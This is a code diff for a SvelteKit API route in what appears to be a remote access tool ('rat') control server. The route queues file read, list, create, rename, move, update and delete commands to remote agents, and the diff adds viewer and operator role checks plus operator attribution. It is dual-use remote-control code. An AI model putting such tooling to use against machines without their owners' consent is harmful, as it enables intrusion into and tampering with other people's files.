@@ -2,6 +2,7 @@ import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { fileManagerStore, FileManagerError } from '$lib/server/rat/file-manager';
 import { registry, RegistryError } from '$lib/server/rat/store';
+import { hasRole, requireOperator, requireViewer } from '$lib/server/authorization';
 import type { FileManagerCommandPayload, FileOperationResponse } from '$lib/types/file-manager';
 
 const ACCEPTED_STATUS = 202;
@@ -31,9 +32,13 @@ function requireEncoding(value: unknown): 'utf-8' | 'base64' | undefined {
 	throw error(400, 'Unsupported file encoding');
 }
 
-function queueFileManagerCommand(agentId: string, payload: FileManagerCommandPayload): void {
+function queueFileManagerCommand(
+	agentId: string,
+	payload: FileManagerCommandPayload,
+	operatorId: string
+): void {
 	try {
-		registry.queueCommand(agentId, { name: 'file-manager', payload });
+		registry.queueCommand(agentId, { name: 'file-manager', payload }, { operatorId });
 	} catch (err) {
 		if (err instanceof RegistryError) {
 			throw error(err.status, err.message);
@@ -48,11 +53,13 @@ function accepted(message: string, extra: Partial<FileOperationResponse> = {}) {
 	});
 }
 
-export const GET: RequestHandler = ({ params, url }) => {
+export const GET: RequestHandler = ({ params, url, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireViewer(locals.user);
 
 	const pathParam = url.searchParams.get('path');
 	const typeParam = url.searchParams.get('type');
@@ -67,16 +74,19 @@ export const GET: RequestHandler = ({ params, url }) => {
 		if (err instanceof FileManagerError) {
 			if (err.status === 404 && refreshRequested && typeParam) {
 				const type = typeParam === 'file' ? 'file' : 'directory';
+				if (!hasRole(user, 'operator')) {
+					throw error(403, 'Operator role required to refresh file resources');
+				}
 				if (type === 'file') {
 					const path = requireString(pathParam, 'File path is required to load file content');
-					queueFileManagerCommand(id, { action: 'read-file', path });
+					queueFileManagerCommand(id, { action: 'read-file', path }, user.id);
 				} else {
 					const payload: FileManagerCommandPayload = {
 						action: 'list-directory',
 						path: pathParam?.trim() ? pathParam.trim() : undefined,
 						includeHidden
 					};
-					queueFileManagerCommand(id, payload);
+					queueFileManagerCommand(id, payload, user.id);
 				}
 				return json(
 					{
@@ -95,11 +105,13 @@ export const GET: RequestHandler = ({ params, url }) => {
 	}
 };
 
-export const POST: RequestHandler = async ({ params, request }) => {
+export const POST: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let payload: Record<string, unknown>;
 	try {
@@ -133,13 +145,17 @@ export const POST: RequestHandler = async ({ params, request }) => {
 						: ''
 					: undefined;
 
-			queueFileManagerCommand(id, {
-				action: 'create-entry',
-				directory,
-				name,
-				entryType: action === 'create-file' ? 'file' : 'directory',
-				content
-			});
+			queueFileManagerCommand(
+				id,
+				{
+					action: 'create-entry',
+					directory,
+					name,
+					entryType: action === 'create-file' ? 'file' : 'directory',
+					content
+				},
+				user.id
+			);
 
 			return accepted(
 				action === 'create-file'
@@ -153,11 +169,13 @@ export const POST: RequestHandler = async ({ params, request }) => {
 	}
 };
 
-export const PATCH: RequestHandler = async ({ params, request }) => {
+export const PATCH: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let payload: Record<string, unknown>;
 	try {
@@ -177,7 +195,7 @@ export const PATCH: RequestHandler = async ({ params, request }) => {
 			const path = requireString(payload.path, 'Entry path is required');
 			const name = requireString(payload.name, 'New entry name is required');
 
-			queueFileManagerCommand(id, { action: 'rename-entry', path, name });
+			queueFileManagerCommand(id, { action: 'rename-entry', path, name }, user.id);
 
 			return accepted('Rename request queued for agent.', { path });
 		}
@@ -186,12 +204,16 @@ export const PATCH: RequestHandler = async ({ params, request }) => {
 			const destination = requireString(payload.destination, 'Destination directory is required');
 			const name = optionalString(payload.name);
 
-			queueFileManagerCommand(id, {
-				action: 'move-entry',
-				path,
-				destination,
-				name
-			});
+			queueFileManagerCommand(
+				id,
+				{
+					action: 'move-entry',
+					path,
+					destination,
+					name
+				},
+				user.id
+			);
 
 			return accepted('Move request queued for agent.', { path: destination });
 		}
@@ -202,12 +224,16 @@ export const PATCH: RequestHandler = async ({ params, request }) => {
 			}
 			const encoding = requireEncoding(payload.encoding);
 
-			queueFileManagerCommand(id, {
-				action: 'update-file',
-				path,
-				content: payload.content,
-				encoding
-			});
+			queueFileManagerCommand(
+				id,
+				{
+					action: 'update-file',
+					path,
+					content: payload.content,
+					encoding
+				},
+				user.id
+			);
 
 			return accepted('File update queued for agent.', { path });
 		}
@@ -216,11 +242,13 @@ export const PATCH: RequestHandler = async ({ params, request }) => {
 	}
 };
 
-export const DELETE: RequestHandler = async ({ params, request }) => {
+export const DELETE: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let payload: Record<string, unknown>;
 	try {
@@ -235,7 +263,7 @@ export const DELETE: RequestHandler = async ({ params, request }) => {
 
 	const path = requireString(payload.path, 'Entry path is required');
 
-	queueFileManagerCommand(id, { action: 'delete-entry', path });
+	queueFileManagerCommand(id, { action: 'delete-entry', path }, user.id);
 
 	return accepted('Delete request queued for agent.', { path });
 };
